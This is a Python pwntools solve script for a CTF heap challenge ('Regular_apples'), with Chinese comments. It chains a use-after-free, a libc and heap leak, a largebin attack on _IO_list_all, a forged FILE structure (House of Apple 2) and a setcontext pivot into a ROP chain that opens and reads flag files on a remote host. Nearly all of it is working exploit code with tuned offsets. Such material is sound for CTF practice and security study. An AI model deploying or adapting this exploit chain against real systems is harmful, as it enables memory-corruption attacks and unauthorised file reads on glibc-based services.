#!/usr/bin/env python3
"""Regular_apples (PWN-03) — UAF + largebin attack → FSOP (House of Apple 2) → setcontext ROP.

用法:  python3 solve.py HOST PORT [DRIFT]   # 决赛靶机；DRIFT 默认 0x80（初赛远端实证）
       python3 solve.py --local [./pwn]     # 本地验证；CWD 需解压附件（libc.so.6 自动 rglob 定位）

链条:
  1. delete 不清指针（UAF）+ 尺寸限制 [0x500,0x520]（大 chunk 无 tcache）
     → unsorted bin 泄露 libc 与堆地址。
  2. largebin attack: free A(0x520) 后 add(0x520) 把 A 排入 largebin 76；UAF 改
     A->bk_nextsize = _IO_list_all-0x20；再 free B(0x510) 后 add(0x520)，B 以
     smaller-than-smallest 分支插入（无完整性检查）→ *(_IO_list_all) = B_chunk。
     （请求 0x520→nb=0x530，两次 malloc 的 largebin 查找都从 bin+1 起跳，不碰被污染的 bin）
  3. add 非法 size → puts("Size error!") + exit(0) → _IO_flush_all 遍历 _IO_list_all
     = 假 _IO_FILE(B)：vtable=_IO_wfile_jumps，_wide_data=W（W->write_base=0,
     write_ptr=1），_mode>0 → wfile-overflow → wide_vtable->__doallocate。
  4. __doallocate = setcontext+0x126（rdx=W）：`mov rcx,[rdx+0xa8]; push rcx;
     mov rdx,[rdx+0x88]; ret` → 跳 `mov rsp,rdx; ret` → rsp=堆上 ROP 栈。
  5. ROP: 对候选路径逐个 open/read/write 直读 flag（远端 seccomp 禁 execve/system）。

远端 libc 差异（初赛实证，勿删）:
  * unsorted/_IO_list_all/_IO_wfile_jumps/setcontext/pop rdi/rsi/mov rsp,rdx 与附件一致。
  * syscall 包装区整体 +0x80：open/read/write 与 pop rdx;pop r12;ret 偏移漂移 → DRIFT 校正。
    决赛若换镜像可传第三参覆盖（如 0）。
  * 长 edit payload 与 socket read 竞争会破坏菜单同步 → 每次 edit 只发实际所需字节。
"""
import re
import sys
from pathlib import Path

from pwn import ELF, context, p64, process, remote, u64

# main_arena 无导出符号（stripped libc）：main_arena+96 为 unsorted head，
# 初赛远端 dump 实证与附件一致。
UNSORTED_OFF = 0x21ACE0
# bin_at(68) = main_arena + 16*68 + 0x50；0x520/0x510 chunk 同属 largebin 68。
BIN68_HEAD_OFF = UNSORTED_OFF + 0x430
REMOTE_DRIFT = 0x80
PATHS = [b"/flag", b"/flag.txt", b"/home/ctf/flag", b"/root/flag", b"/home/user/flag", b"/tmp/flag"]
FLAG_RE = re.compile(rb"[A-Za-z0-9_]{3,20}\{[^}\n]{4,80}\}")


def find_gadget(libc, pattern):
    text = libc.get_section_by_name(".text")
    off = text.data().find(pattern)
    assert off >= 0, f"gadget {pattern} not found"
    return text.header.sh_addr + off


def build_offsets(libc, drift):
    # 仅 syscall 包装区（open/read/write/pop rdx;pops r12）随远端漂移
    return {
        "open": libc.sym.open + drift,
        "read": libc.sym.read + drift,
        "write": libc.sym.write + drift,
        "pop_rdx_r12": find_gadget(libc, b"\x5a\x41\x5c\xc3") + drift,
        "pop_rdi": find_gadget(libc, b"\x5f\xc3"),
        "pop_rsi": find_gadget(libc, b"\x5e\xc3"),
        "mov_rsp_rdx": find_gadget(libc, b"\x48\x89\xd4\xc3"),
        "io_list_all": libc.sym["_IO_list_all"],
        "wfile_jumps": libc.sym["_IO_wfile_jumps"],
        "sc_pivot": libc.sym.setcontext + 0x126,
        "unsorted": UNSORTED_OFF,
        "bin68_head": BIN68_HEAD_OFF,
    }


def add(p, idx, size, content=b"A" * 8):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Index: \n", str(idx).encode())
    p.sendlineafter(b"Size: \n", str(size).encode())
    p.sendafter(b"Content: \n", content)


def delete(p, idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Index: \n", str(idx).encode())


def edit(p, idx, content):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"Index: \n", str(idx).encode())
    p.sendafter(b"Content: \n", content)


def show(p, idx):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"Index: \n", str(idx).encode())
    return p.recvn(8)


def build_rop(off, libc, path_addrs, buf_addrs):
    chain = []
    fd = 3
    g = lambda k: libc + off[k]
    for path, buf in zip(path_addrs, buf_addrs):
        chain += [g("pop_rdi"), path, g("pop_rsi"), 0, g("open")]
        chain += [g("pop_rdi"), fd, g("pop_rsi"), buf, g("pop_rdx_r12"), 0x40, 0, g("read")]
        chain += [g("pop_rdi"), 1, g("pop_rsi"), buf, g("pop_rdx_r12"), 0x40, 0, g("write")]
        fd += 1
    return b"".join(p64(x) for x in chain)


def exploit(p, off, paths, log, trigger=True):
    # 堆布局: A(idx0,0x520) G(idx1) B(idx2) H1(idx3,ROP栈+路径) C(idx4) H2(idx5)
    add(p, 0, 0x510)
    for i in range(1, 6):
        add(p, i, 0x500)

    # 泄露: B、C 进 unsorted；B->fd=main_arena+96，C->fd=B_chunk
    delete(p, 2)
    delete(p, 4)
    libc = u64(show(p, 2)) - off["unsorted"]
    B_chunk = u64(show(p, 4))
    A_chunk = B_chunk - 0x520 - 0x510
    B_user = B_chunk + 0x10
    H1_user = B_chunk + 0x520
    log(f"libc base = {libc:#x}  B_chunk = {B_chunk:#x}")

    # 收回 B、C
    add(p, 6, 0x500)
    add(p, 7, 0x500)

    # A 进 largebin76；nb=0x530 的查找跳过该 bin → 正常返回 top
    delete(p, 0)
    add(p, 8, 0x520)
    # UAF 改 A->bk_nextsize = _IO_list_all-0x20（fd/bk 写回真实 bin head）
    edit(p, 0, p64(libc + off["bin68_head"]) * 2 + p64(A_chunk) + p64(libc + off["io_list_all"] - 0x20))
    # B 插入 smaller-than-smallest 分支 → _IO_list_all = B_chunk
    delete(p, 2)
    add(p, 9, 0x520)
    log("[+] largebin attack done: _IO_list_all -> B_chunk")

    # H1(idx3): 路径串 + ROP 栈。每次 read 写各自槽位（0x40），不破坏未执行的链与后续路径
    ROP_STACK = H1_user + 0x100
    path_addrs, buf_addrs = [], []
    h_payload = bytearray(0x500)
    for i, path in enumerate(paths):
        slot = 0x20 + i * 0x40
        h_payload[slot:slot + len(path)] = path + b"\x00"
        path_addrs.append(H1_user + slot)
        buf_addrs.append(H1_user + slot)
    rop = build_rop(off, libc, path_addrs, buf_addrs)
    assert 0x100 + len(rop) <= 0x500
    h_payload[0x100:0x100 + len(rop)] = rop
    edit(p, 3, bytes(h_payload[:0x100 + len(rop)]))

    # B(idx2): 假 _IO_FILE + wide_data(W) + wide_vtable(V)
    # _IO_list_all 被写成 B_chunk（chunk 头），flush 以 fp=B_chunk 读字段；
    # 数据落在 B_user=B_chunk+0x10，故 FILE 字段按 fp 视角偏移 -0x10 写入：
    # fp+0x68 _chain←fake[0x58]、fp+0x88 _lock←0x78、fp+0xa0 _wide_data←0x90、
    # fp+0xc0 _mode←0xb0、fp+0xd8 vtable←0xc8（字段偏移以 _IO_2_1_stderr_ 实测为准）
    W = B_user + 0x100
    V = B_user + 0x200
    LOCK = B_user + 0x300
    fake = bytearray(0x500)
    fake[0x58:0x60] = p64(0)                        # fp+0x68 _chain
    fake[0x78:0x80] = p64(LOCK)                     # fp+0x88 _lock
    fake[0x90:0x98] = p64(W)                        # fp+0xa0 _wide_data
    fake[0xB0:0xB4] = (1).to_bytes(4, "little")     # fp+0xc0 _mode > 0
    fake[0xC8:0xD0] = p64(libc + off["wfile_jumps"])  # fp+0xd8 vtable
    fake[0x118:0x120] = p64(0)                      # W->_IO_write_base = 0
    fake[0x120:0x128] = p64(1)                      # W->_IO_write_ptr = 1
    fake[0x130:0x138] = p64(0)                      # W->_IO_buf_base = 0
    fake[0x188:0x190] = p64(ROP_STACK)              # W+0x88 → rdx → 新 rsp
    fake[0x1A8:0x1B0] = p64(libc + off["mov_rsp_rdx"])  # W+0xa8 → push 后 rip
    fake[0x1E0:0x1E8] = p64(V)                      # W->_wide_vtable
    fake[0x268:0x270] = p64(libc + off["sc_pivot"])  # V+0x68 __doallocate
    edit(p, 2, bytes(fake[:0x270]))

    if trigger:
        # 触发: add 非法 size → exit(0) → _IO_flush_all → FSOP → ROP
        p.sendlineafter(b"> ", b"1")
        p.sendlineafter(b"Index: \n", b"11")
        p.sendlineafter(b"Size: \n", b"256")
        log("[+] exit triggered")
    return p


def main():
    args = sys.argv[1:]
    if args and args[0] == "--local":
        binary = Path(args[1] if len(args) > 1 else "./pwn").resolve()
        drift = 0
        ld = binary.parent / "ld-linux-x86-64.so.2"
        if ld.exists():
            argv = [str(ld), "--library-path", str(binary.parent), str(binary)]
        else:
            print("[!] 附件 ld 不存在，用系统 libc 启动（仅冒烟，全链以远端为准）")
            argv = [str(binary)]
        connect = lambda: process(argv, cwd=str(binary.parent))
    else:
        host, port = args[0], int(args[1])
        drift = int(args[2], 0) if len(args) > 2 else REMOTE_DRIFT
        connect = lambda: remote(host, port, timeout=15)

    libcs = sorted(Path.cwd().rglob("libc.so.6"))
    assert libcs, "libc.so.6 not found under CWD (unzip attachment first)"
    context.arch = "amd64"
    context.log_level = "info"
    libc = ELF(str(libcs[0]), checksec=False)
    off = build_offsets(libc, drift)
    print(f"[*] libc: {libcs[0]}  drift={drift:#x}")
    print("[*] " + "  ".join(f"{k}={v:#x}" for k, v in off.items()))

    p = exploit(connect(), off, PATHS, lambda m: print(f"[*] {m}"))
    out = p.recvall(timeout=15)
    p.close()
    print(out.decode(errors="replace"))
    m = FLAG_RE.search(out)
    if m:
        print(f"[+] FLAG: {m.group().decode()}")


if __name__ == "__main__":
    main()
